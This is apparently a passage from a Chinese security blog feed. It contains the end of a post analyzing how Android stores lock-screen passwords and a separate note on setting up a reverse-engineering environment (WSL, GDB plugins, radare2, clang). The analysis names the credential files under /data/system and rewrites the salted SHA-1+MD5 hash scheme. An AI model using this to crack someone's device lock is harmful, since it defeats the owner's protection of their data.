        <span style="color:#66d9ef">public</span> Handler <span style="color:#a6e22e">getHandler</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Handler<span style="color:#f92672">();</span>
        <span style="color:#f92672">}</span>

        <span style="color:#66d9ef">public</span> LockSettingsStorage <span style="color:#a6e22e">getStorage</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">final</span> LockSettingsStorage storage <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> LockSettingsStorage<span style="color:#f92672">(</span>mContext<span style="color:#f92672">);</span>
            storage<span style="color:#f92672">.</span><span style="color:#a6e22e">setDatabaseOnCreateCallback</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> LockSettingsStorage<span style="color:#f92672">.</span><span style="color:#a6e22e">Callback</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
                <span style="color:#a6e22e">@Override</span>
                <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">initialize</span><span style="color:#f92672">(</span>SQLiteDatabase db<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                    <span style="color:#75715e">// Get the lockscreen default from a system property, if available
</span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">boolean</span> lockScreenDisable <span style="color:#f92672">=</span> SystemProperties<span style="color:#f92672">.</span><span style="color:#a6e22e">getBoolean</span><span style="color:#f92672">(</span>
                            <span style="color:#e6db74">&#34;ro.lockscreen.disable.default&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>lockScreenDisable<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                        storage<span style="color:#f92672">.</span><span style="color:#a6e22e">writeKeyValue</span><span style="color:#f92672">(</span>db<span style="color:#f92672">,</span> LockPatternUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">DISABLE_LOCKSCREEN_KEY</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">,</span> 0<span style="color:#f92672">);</span>
                    <span style="color:#f92672">}</span>
                <span style="color:#f92672">}</span>
            <span style="color:#f92672">});</span>
            <span style="color:#66d9ef">return</span> storage<span style="color:#f92672">;</span>
        <span style="color:#f92672">}</span>

<span style="color:#66d9ef">public</span> <span style="color:#a6e22e">LockSettingsService</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">this</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Injector<span style="color:#f92672">(</span>context<span style="color:#f92672">));</span>
    <span style="color:#f92672">}</span>


</code></pre></div><p>继续  查看LockSettingsStorage.java 类中   存在数据库中</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseHelper</span> <span style="color:#66d9ef">extends</span> SQLiteOpenHelper <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String TAG <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;LockSettingsDB&#34;</span><span style="color:#f92672">;</span>
        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String DATABASE_NAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;locksettings.db&#34;</span><span style="color:#f92672">;</span>

        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> DATABASE_VERSION <span style="color:#f92672">=</span> 2<span style="color:#f92672">;</span>
        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> IDLE_CONNECTION_TIMEOUT_MS <span style="color:#f92672">=</span> 30000<span style="color:#f92672">;</span>

        <span style="color:#66d9ef">private</span> Callback mCallback<span style="color:#f92672">;</span>

        <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">DatabaseHelper</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">super</span><span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> DATABASE_NAME<span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> DATABASE_VERSION<span style="color:#f92672">);</span>
            setWriteAheadLoggingEnabled<span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
            <span style="color:#75715e">// Memory optimization - close idle connections after 30s of inactivity
</span><span style="color:#75715e"></span>            setIdleConnectionTimeout<span style="color:#f92672">(</span>IDLE_CONNECTION_TIMEOUT_MS<span style="color:#f92672">);</span>
        <span style="color:#f92672">}</span>

        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setCallback</span><span style="color:#f92672">(</span>Callback callback<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            mCallback <span style="color:#f92672">=</span> callback<span style="color:#f92672">;</span>
        <span style="color:#f92672">}</span>

        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">createTable</span><span style="color:#f92672">(</span>SQLiteDatabase db<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            db<span style="color:#f92672">.</span><span style="color:#a6e22e">execSQL</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;CREATE TABLE &#34;</span> <span style="color:#f92672">+</span> TABLE <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; (&#34;</span> <span style="color:#f92672">+</span>
                    <span style="color:#e6db74">&#34;_id INTEGER PRIMARY KEY AUTOINCREMENT,&#34;</span> <span style="color:#f92672">+</span>
                    COLUMN_KEY <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; TEXT,&#34;</span> <span style="color:#f92672">+</span>
                    COLUMN_USERID <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; INTEGER,&#34;</span> <span style="color:#f92672">+</span>
                    COLUMN_VALUE <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; TEXT&#34;</span> <span style="color:#f92672">+</span>
                    <span style="color:#e6db74">&#34;);&#34;</span><span style="color:#f92672">);</span>
        <span style="color:#f92672">}</span>

        <span style="color:#a6e22e">@Override</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>SQLiteDatabase db<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            createTable<span style="color:#f92672">(</span>db<span style="color:#f92672">);</span>
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>mCallback <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                mCallback<span style="color:#f92672">.</span><span style="color:#a6e22e">initialize</span><span style="color:#f92672">(</span>db<span style="color:#f92672">);</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>

        <span style="color:#a6e22e">@Override</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onUpgrade</span><span style="color:#f92672">(</span>SQLiteDatabase db<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> oldVersion<span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span> currentVersion<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">int</span> upgradeVersion <span style="color:#f92672">=</span> oldVersion<span style="color:#f92672">;</span>
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>upgradeVersion <span style="color:#f92672">==</span> 1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                <span style="color:#75715e">// Previously migrated lock screen widget settings. Now defunct.
</span><span style="color:#75715e"></span>                upgradeVersion <span style="color:#f92672">=</span> 2<span style="color:#f92672">;</span>
            <span style="color:#f92672">}</span>

            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>upgradeVersion <span style="color:#f92672">!=</span> DATABASE_VERSION<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                Log<span style="color:#f92672">.</span><span style="color:#a6e22e">w</span><span style="color:#f92672">(</span>TAG<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Failed to upgrade database!&#34;</span><span style="color:#f92672">);</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">}</span>
</code></pre></div><p>看到了数据库的名字叫作：locksettings.db  保存在了：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String SYSTEM_DIRECTORY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/system/&#34;</span><span style="color:#f92672">;</span>    <span style="color:#75715e">//目录
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String LOCK_PATTERN_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gatekeeper.pattern.key&#34;</span><span style="color:#f92672">;</span>   
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String BASE_ZERO_LOCK_PATTERN_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gatekeeper.gesture.key&#34;</span><span style="color:#f92672">;</span>
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String LEGACY_LOCK_PATTERN_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gesture.key&#34;</span><span style="color:#f92672">;</span>    <span style="color:#75715e">//key1
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String LOCK_PASSWORD_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gatekeeper.password.key&#34;</span><span style="color:#f92672">;</span>
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String LEGACY_LOCK_PASSWORD_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;password.key&#34;</span><span style="color:#f92672">;</span>    <span style="color:#75715e">//key2
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String CHILD_PROFILE_LOCK_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gatekeeper.profile.key&#34;</span><span style="color:#f92672">;</span>
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String SYNTHETIC_PASSWORD_DIRECTORY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;spblob/&#34;</span><span style="color:#f92672">;</span>
</code></pre></div><p>数据库文件存在/data/system/locksetting.db</p>
<p>测试  在/data/system/下看到password.key</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-1-1.png" alt=""></p>
<p>打开看看：<img src="http://my-md-1253484710.coscd.myqcloud.com/android-note-1-2.png" alt=""></p>
<p>手动简单实现加密算法：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">passwordToHash</span><span style="color:#f92672">(</span>String password<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>password <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
        <span style="color:#f92672">}</span>
        <span style="color:#66d9ef">byte</span> <span style="color:#f92672">[]</span> hashed <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> saltedPassword <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>password <span style="color:#f92672">+</span> SALT<span style="color:#f92672">).</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">();</span>    <span style="color:#75715e">//SALT 值从数据库中得到 拿到之后进行hex转换
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> sha1 <span style="color:#f92672">=</span> MessageDigest<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SHA-1&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">digest</span><span style="color:#f92672">(</span>saltedPassword<span style="color:#f92672">);</span>
            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> md5 <span style="color:#f92672">=</span> MessageDigest<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;MD5&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">digest</span><span style="color:#f92672">(</span>saltedPassword<span style="color:#f92672">);</span>
            hashed <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>toHex<span style="color:#f92672">(</span>sha1<span style="color:#f92672">)+</span>toHex<span style="color:#f92672">(</span>md5<span style="color:#f92672">)).</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">();</span>
        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span><span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){</span>
            
        <span style="color:#f92672">}</span>
        <span style="color:#66d9ef">return</span> hashed<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">toHex</span><span style="color:#f92672">(</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> ary<span style="color:#f92672">){</span>
        <span style="color:#66d9ef">final</span> String hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;102031398sjdfklaj&#34;</span><span style="color:#f92672">;</span>
        String ret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
        <span style="color:#66d9ef">for</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span>0<span style="color:#f92672">;</span>i<span style="color:#f92672">&lt;</span>ary<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">;</span>i<span style="color:#f92672">++){</span>
            ret <span style="color:#f92672">+=</span> hex<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">((</span>ary<span style="color:#f92672">[</span>i<span style="color:#f92672">]&gt;&gt;</span> 4<span style="color:#f92672">)&amp;</span> 0xf<span style="color:#f92672">);</span>
            ret <span style="color:#f92672">+=</span> hex<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>ary<span style="color:#f92672">[</span>i<span style="color:#f92672">]&amp;</span> 0xf<span style="color:#f92672">);</span>
        <span style="color:#f92672">}</span>
        <span style="color:#66d9ef">return</span> ret<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>
</code></pre></div><p>SALT 的值可以从数据库中拿到 也可以利用反射获取</p>
<p>总结：</p>
<p>​	MD5(输的明文密码+设备的salt).hex+ SHA1(输的的明文密码+设备的salt值).hex</p>
<blockquote>
<p>2.2 手势密码分析</p>
</blockquote>
<p>大致同上</p>
<h4 id="3-简要">3. 简要：</h4>
<p>​	九宫格团装化成字节数组-&gt;sha1 加密  即可</p>
<p>​	 其实大致流程和分析输入密码差不多   保存到本地的目录、/data/system/gesture.key 文件</p>
]]></content>
        </item>
        
        <item>
            <title>环境记录(手动置顶)</title>
            <link>https://kuekiko.top/posts/1/01/%E7%8E%AF%E5%A2%83%E8%AE%B0%E5%BD%95%E6%89%8B%E5%8A%A8%E7%BD%AE%E9%A1%B6/</link>
            <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
            
            <guid>https://kuekiko.top/posts/1/01/%E7%8E%AF%E5%A2%83%E8%AE%B0%E5%BD%95%E6%89%8B%E5%8A%A8%E7%BD%AE%E9%A1%B6/</guid>
            <description>用来不时记录平时所用环境配置，以及遇到的各种问题以及解决办法。主要是为了防丢失，以及总是和空气斗志斗勇。
 Win10  日常使用
 WSL 默认不是root 设置默认root用户。ubuntu config --default-user root
  on my zsh 装上
官方github
需要先安装ZSH。
安装on my zsh:
via curl：sh -c &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&amp;quot;
via wget: sh -c &amp;quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&amp;quot;
然后配置喜欢的 插件+主题。vi ~/.zshrc 修改plugins属性
必备插件git、autojump、zsh-autosuggestions。主题
  GDB装上+pwndbg+peda+gef
wsl的ubuntu不支持x86，所以主要只能调试x64的程序，而且可能会出现莫名其妙的错误。
不过可以使用qemu来运行x86的程序，调试还是不行会出错。参考
sudo apt updatesudo apt install qemu-user-staticsudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic &amp;#39;\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00&amp;#39; --mask &amp;#39;\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff&amp;#39;# 运行下面的一条命令就行跑x86 不过每次打开wsl都得运行一次，很麻烦，可以写脚本自动开启。sudo service binfmt-support start  pwndbg+peda+gef</description>
            <content type="html"><![CDATA[<blockquote>
<p>用来不时记录平时所用环境配置，以及遇到的各种问题以及解决办法。主要是为了防丢失，以及总是和空气斗志斗勇。</p>
</blockquote>
<h3 id="win10">Win10</h3>
<blockquote>
<p>日常使用</p>
</blockquote>
<h5 id="wsl">WSL</h5>
<p>默认不是root 设置默认root用户。<code>ubuntu config --default-user root</code></p>
<ul>
<li>
<p>on my zsh 装上</p>
<p><a href="https://github.com/robbyrussell/oh-my-zsh">官方github</a></p>
<p>需要先安装<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Installing-ZSH">ZSH</a>。</p>
<p>安装on my zsh:</p>
<p>via curl：<code>sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</code></p>
<p>via wget: <code>sh -c &quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</code></p>
<p>然后配置喜欢的 插件+主题。<code>vi ~/.zshrc</code> 修改<code>plugins</code>属性</p>
<p>必备插件git、autojump、zsh-autosuggestions。<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Themes">主题</a></p>
</li>
<li>
<p>GDB装上+pwndbg+peda+gef</p>
<p>wsl的ubuntu不支持x86，所以主要只能调试x64的程序，而且可能会出现莫名其妙的错误。</p>
<p>不过可以使用qemu来运行x86的程序，调试还是不行会出错。<a href="https://github.com/Microsoft/WSL/issues/2468">参考</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt update
sudo apt install qemu-user-static
sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic <span style="color:#e6db74">&#39;\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00&#39;</span> --mask <span style="color:#e6db74">&#39;\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff&#39;</span>
<span style="color:#75715e"># 运行下面的一条命令就行跑x86 不过每次打开wsl都得运行一次，很麻烦，可以写脚本自动开启。</span>
sudo service binfmt-support start
</code></pre></div><ul>
<li>
<p>pwndbg+peda+gef</p>
<p>三个都可能用到，三个工具特性不一样。各有强项，所以三个都装，使用脚本<code>gdb.sh</code>启动选项</p>
<p>安装pwndbg:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
</code></pre></div><p>peda:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/longld/peda.git ~/peda
echo <span style="color:#e6db74">&#34;source ~/peda/peda.py&#34;</span> &gt;&gt; ~/.gdbinit
</code></pre></div><p>gef:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># via the install script</span>
$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
    
<span style="color:#75715e"># manually</span>
$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py
$ echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit
</code></pre></div><p>gdb.sh  把该文件放在<code>/usr/local/sbin</code>  参考</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> Mode_change <span style="color:#f92672">{</span>
        name<span style="color:#f92672">=</span>$1
        gdbinitfile<span style="color:#f92672">=</span>~/.gdbinit    <span style="color:#75715e">#这个路径按照你的实际情况修改</span>
        <span style="color:#75715e"># gdbinitfile=/root/Desktop/mode</span>
        <span style="color:#75715e">#路径按照你的实际情况修改</span>
        peda<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;source ~/peda/peda.py&#34;</span>   
        gef<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;source ~/.gdbinit-gef.py&#34;</span>   
        pwndbg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;source /home/pwndbg/gdbinit.py&#34;</span>  
    
        sign<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat $gdbinitfile | grep -n <span style="color:#e6db74">&#34;#this place is controled by user&#39;s shell&#34;</span><span style="color:#66d9ef">)</span>
           <span style="color:#75715e">#此处上面的查找内容要和你自己的保持一致</span>
    
        pattern<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;:#this place is controled by user&#39;s shell&#34;</span>
        number<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>sign%$pattern<span style="color:#e6db74">}</span>
        location<span style="color:#f92672">=</span>$<span style="color:#f92672">[</span>number+2<span style="color:#f92672">]</span>
    
        parameter_add<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>location<span style="color:#e6db74">}</span>i
        parameter_del<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>location<span style="color:#e6db74">}</span>d
    
        message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;TEST&#34;</span>
    
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $name -eq <span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#f92672">]</span>;<span style="color:#66d9ef">then</span>
                sed -i <span style="color:#e6db74">&#34;</span>$parameter_del<span style="color:#e6db74">&#34;</span> $gdbinitfile
                sed -i <span style="color:#e6db74">&#34;</span>$parameter_add<span style="color:#e6db74"> </span>$peda<span style="color:#e6db74">&#34;</span> $gdbinitfile
                echo -e <span style="color:#e6db74">&#34;Please enjoy the peda!\n&#34;</span>
        <span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> $name -eq <span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#f92672">]</span>;<span style="color:#66d9ef">then</span>
                sed -i <span style="color:#e6db74">&#34;</span>$parameter_del<span style="color:#e6db74">&#34;</span> $gdbinitfile
                sed -i <span style="color:#e6db74">&#34;</span>$parameter_add<span style="color:#e6db74"> </span>$gef<span style="color:#e6db74">&#34;</span> $gdbinitfile
                echo -e <span style="color:#e6db74">&#34;Please enjoy the gef!\n&#34;</span>
        <span style="color:#66d9ef">else</span>
                sed -i <span style="color:#e6db74">&#34;</span>$parameter_del<span style="color:#e6db74">&#34;</span> $gdbinitfile
                sed -i <span style="color:#e6db74">&#34;</span>$parameter_add<span style="color:#e6db74"> </span>$pwndbg<span style="color:#e6db74">&#34;</span> $gdbinitfile
                echo -e <span style="color:#e6db74">&#34;Please enjoy the pwndbg!\n&#34;</span>
        <span style="color:#66d9ef">fi</span>
<span style="color:#f92672">}</span>
    
echo -e <span style="color:#e6db74">&#34;Please choose one mode of GDB?\n1.peda    2.gef    3.pwndbg&#34;</span>
    
read -p <span style="color:#e6db74">&#34;Input your choice:&#34;</span> num
    
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $num -eq <span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#f92672">]</span>;<span style="color:#66d9ef">then</span>
        Mode_change $num
<span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> $num -eq <span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#f92672">]</span>;<span style="color:#66d9ef">then</span>
        Mode_change $num
<span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> $num -eq <span style="color:#e6db74">&#34;3&#34;</span> <span style="color:#f92672">]</span>;<span style="color:#66d9ef">then</span>
        Mode_change $num
<span style="color:#66d9ef">else</span>
        echo -e <span style="color:#e6db74">&#34;Error!\nPleasse input right number!&#34;</span>
<span style="color:#66d9ef">fi</span>
    
gdb $1 $2 $3 $4 $5 $6 $7 $8 $9#
</code></pre></div></li>
</ul>
</li>
<li>
<p>r2全家桶 （逆向调试神器）</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/radare/radare2.git
cd radare2
sys/install.sh  <span style="color:#75715e">#Install / Update</span>
</code></pre></div></li>
<li>
<p>gcc arm aarch aarch64</p>
<p><code>sudo apt install gcc-arm-linux-gnueabi</code> 使用命令<code>arm-linux-gnueabi-gcc</code></p>
<p><code>sudo apt install gcc-aarch64-linux-gnu</code>  使用命令<code>aarch64-linux-gnu-gcc</code></p>
</li>
<li>
<p>clang+llvm</p>
<ul>
<li>
<p>方法一，手动编译安装，费时费力</p>
</li>
<li>
<p>方法二 apt</p>
<p>完整方法这个<a href="http://apt.llvm.org/">地址</a></p>
<p>只写ubuntu 18,04</p>
<ol>
<li>编辑 /etc/apt/sources.list，添加源</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># i386 not available</span>
deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic main
deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic main
<span style="color:#75715e"># 7</span>
deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main
deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main
<span style="color:#75715e"># 8</span>
deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main
deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main
</code></pre></div><ol start="2">
<li>添加证书</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key|sudo apt-key add -
<span style="color:#75715e"># Fingerprint: 6084 F3CF 814B 57C1 CF12 EFD5 15CF 4D18 AF4F 7421</span> 
</code></pre></div><ol start="3">
<li>安装 版本8</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># LLVM</span>
apt-get install libllvm-8-ocaml-dev libllvm8 llvm-8 llvm-8-dev llvm-8-doc llvm-8-examples llvm-8-runtime
<span style="color:#75715e"># Clang and co</span>
apt-get install clang-8 clang-tools-8 clang-8-doc libclang-common-8-dev libclang-8-dev libclang1-8 clang-format-8 python-clang-8
<span style="color:#75715e"># libfuzzer</span>
apt-get install libfuzzer-8-dev
<span style="color:#75715e"># lldb</span>
apt-get install lldb-8
<span style="color:#75715e"># lld (linker)</span>
apt-get install lld-8
<span style="color:#75715e"># libc++</span>
apt-get install libc++-8-dev libc++abi-8-dev
<span style="color:#75715e"># OpenMP</span>
apt-get install libomp-8-dev
</code></pre></div></li>
</ul>
</li>
<li>
<p>python3+pip</p>
<p><code>apt install python3 python3-pip、python-pip</code></p>
</li>
<li>
<p>python库</p>
<ul>
<li>
<p>frida （hook) 同win下使用</p>
</li>
<li>
<p>pwntools (py2)</p>
</li>
<li>
<p>gmpy2 (py2-3)</p>
</li>
</ul>
</li>
<li>
<p>r2Frida</p>
</li>
<li>
<p>Brida</p>
</li>
</ul>
